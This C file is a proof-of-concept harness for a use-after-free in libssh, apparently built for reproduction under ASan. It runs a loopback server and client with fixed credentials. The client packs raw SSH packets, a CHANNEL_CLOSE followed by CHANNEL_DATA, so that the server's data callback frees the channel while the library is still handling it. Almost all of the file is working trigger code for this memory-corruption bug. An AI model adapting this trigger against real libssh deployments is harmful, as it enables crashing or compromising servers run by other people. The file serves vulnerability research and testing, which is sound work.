#include "config.h"
/* Real-build replay: authenticated loopback libssh peer sends CHANNEL_CLOSE
 * followed by CHANNEL_DATA; server app frees the channel in its data callback.
 * Built against the pinned vulnerable libssh commit under ASan. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <libssh/libssh.h>
#include <libssh/server.h>
#include <libssh/buffer.h>
#include <libssh/callbacks.h>
#include <libssh/session.h>
#include <libssh/channels.h>
#include <libssh/ssh2.h>
#include <libssh/packet.h>

#define PORT 42229
static volatile int g_done = 0;
static int g_send_close = 1;
static int g_data_packets = 0;
static int g_free_on_data = 1;

static int auth_password(ssh_session s, const char *user, const char *pass, void *u)
{
    (void)s; (void)u;
    int rc = (strcmp(user, "mishe") == 0 && strcmp(pass, "mishe-uaf") == 0) ?
             SSH_AUTH_SUCCESS : SSH_AUTH_DENIED;
    printf("SERVER auth len user=%zu pass=%zu success=%d\n",
           strlen(user), strlen(pass), SSH_AUTH_SUCCESS);
    fflush(stdout);
    return rc;
}

static ssh_channel open_session(ssh_session s, void *u)
{
    (void)u;
    return ssh_channel_new(s);
}

static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                   int stderr, void *u)
{
    (void)s; (void)stderr; (void)u;
    printf("SERVER data #%d len=%u first=%c%s%c\n", ++g_data_packets, len,
           ((char *)data)[0], len > 16 ? " off16=" : "",
           len > 16 ? ((char *)data)[16] : ' ');
    fflush(stdout);
    if (g_data_packets == 2 && g_free_on_data) {
        /* The app drops the channel as soon as it sees data after close.
         * ssh_channel_free() calls ssh_channel_do_free() because CLOSED_REMOTE
         * is already set: buffers, callbacks and the channel itself are freed
         * while channel_rcv_data() is still running. */
        ssh_channel_free(ch);
        g_done = 1;
    }
    return (int)len;
}

static void on_close(ssh_session s, ssh_channel ch, void *u)
{
    (void)s; (void)u;
    printf("SERVER close callback\n");
    fflush(stdout);
}

static int run_server(const char *keyfile)
{
    ssh_bind bind = ssh_bind_new();
    ssh_session s;
    ssh_event event;
    struct ssh_server_callbacks_struct scb;
    struct ssh_channel_callbacks_struct ccb;
    int rc;

    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDADDR, "127.0.0.1");
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_BINDPORT, &(int){ PORT });
    ssh_bind_options_set(bind, SSH_BIND_OPTIONS_HOSTKEY, keyfile);
    if (ssh_bind_listen(bind) < 0) {
        fprintf(stderr, "bind failed: %s\n", ssh_get_error(bind));
        return 1;
    }
    s = ssh_new();
    if (ssh_bind_accept(bind, s) != SSH_OK) {
        fprintf(stderr, "accept failed: %s\n", ssh_get_error(bind));
        return 1;
    }
    memset(&scb, 0, sizeof(scb));
    scb.auth_password_function = auth_password;
    scb.channel_open_request_session_function = open_session;
    ssh_callbacks_init(&scb);
    ssh_set_server_callbacks(s, &scb);
    ssh_set_auth_methods(s, SSH_AUTH_METHOD_PASSWORD);
    if (ssh_handle_key_exchange(s) != SSH_OK) {
        fprintf(stderr, "server kex failed: %s\n", ssh_get_error(s));
        return 1;
    }
    event = ssh_event_new();
    ssh_event_add_session(event, s);

    memset(&ccb, 0, sizeof(ccb));
    ccb.channel_data_function = on_data;
    ccb.channel_close_function = on_close;
    ssh_callbacks_init(&ccb);
    /* Register on channels as they are opened (first data arrives before we
     * can otherwise reach the channel pointer). */
    for (int i = 0; i < 400 && !g_done; i++) {
        struct ssh_iterator *it;
        int n = 0;
        for (it = ssh_list_get_iterator(s->channels); it != NULL;
             it = ssh_list_get_iterator(s->channels)) {
            ssh_channel ch = (ssh_channel)it->data;
            if (ch != NULL && ch->callbacks == NULL && n++ == 0) {
                ssh_add_channel_callbacks(ch, &ccb);
                printf("SERVER registered callbacks on channel %u\n",
                       ch->local_channel);
                fflush(stdout);
            }
            /* avoid an infinite loop over the same head element */
            break;
        }
        ssh_event_dopoll(event, 100);
    }
    printf("SERVER done data_packets=%d\n", g_data_packets);
    fflush(stdout);
    return 0;
}

static int raw_u8(ssh_session s, uint32_t recipient, uint8_t type)
{
    if (ssh_buffer_pack(s->out_buffer, "bd", type, recipient) != SSH_OK)
        return -1;
    return ssh_packet_send(s);
}

static int raw_data(ssh_session s, uint32_t recipient, const char *payload)
{
    uint32_t n = (uint32_t)strlen(payload);
    if (ssh_buffer_pack(s->out_buffer, "bd", SSH2_MSG_CHANNEL_DATA,
                        recipient) != SSH_OK)
        return -1;
    if (ssh_buffer_pack(s->out_buffer, "dP", n, (size_t)n, payload) != SSH_OK)
        return -1;
    return ssh_packet_send(s);
}

static int run_client(void)
{
    ssh_session s = ssh_new();
    ssh_channel ch;
    int rc, port = PORT;
    const char marker[] = "MISHE-LIBSSH-UAF-WIRE";

    ssh_options_set(s, SSH_OPTIONS_HOST, "127.0.0.1");
    ssh_options_set(s, SSH_OPTIONS_PORT, &port);
    ssh_options_set(s, SSH_OPTIONS_USER, "mishe");
    if (ssh_connect(s) != SSH_OK) {
        fprintf(stderr, "client connect failed: %s\n", ssh_get_error(s));
        return 1;
    }
    rc = ssh_userauth_password(s, NULL, "mishe-uaf");
    printf("CLIENT auth rc=%d\n", rc);
    fflush(stdout);
    if (rc != SSH_AUTH_SUCCESS) return 1;
    ch = ssh_channel_new(s);
    if (ch == NULL || ssh_channel_open_session(ch) != SSH_OK) {
        fprintf(stderr, "client channel open failed\n");
        return 1;
    }
    printf("CLIENT channel local=%u remote=%u\n", ch->local_channel,
           ch->remote_channel);
    fflush(stdout);
    if (ssh_channel_write(ch, "first-packet", 12) != 12) {
        fprintf(stderr, "client first write failed\n");
        return 1;
    }
    usleep(200000);
    /* Wire-level remote close followed by data: a peer can emit these two
     * packets back to back even though the public write API refuses post-close
     * writes. */
    if (g_send_close) {
        if (raw_u8(s, ch->remote_channel, SSH2_MSG_CHANNEL_CLOSE) != 0) {
            fprintf(stderr, "raw close failed\n");
            return 1;
        }
        usleep(200000);
    }
    usleep(200000);
    if (raw_data(s, ch->remote_channel, marker) != 0) {
        fprintf(stderr, "raw data failed\n");
        return 1;
    }
    usleep(500000);
    printf("CLIENT sent close+data marker=%s\n", marker);
    fflush(stdout);
    ssh_channel_free(ch);
    ssh_disconnect(s);
    ssh_free(s);
    return 0;
}

int main(int argc, char **argv)
{
    ssh_set_log_level(SSH_LOG_PROTOCOL);
    ssh_init();
    pid_t pid;
    if (argc < 2 || argc > 3) {
        fprintf(stderr, "usage: %s hostkey [data-only]\n", argv[0]);
        return 2;
    }
    if (argc == 3 && strcmp(argv[2], "data-only") == 0) {
        g_send_close = 0;
        g_free_on_data = 0;
    }
    pid = fork();
    if (pid == 0) {
        int rc = run_server(argv[1]);
        _exit(rc);
    }
    usleep(500000);
    int crc = run_client();
    int wstatus = 0;
    waitpid(pid, &wstatus, 0);
    printf("CLIENT rc=%d SERVER status=0x%x\n", crc, wstatus);
    return (crc == 0 && WIFEXITED(wstatus) && WEXITSTATUS(wstatus) == 0) ? 0 : 1;
}
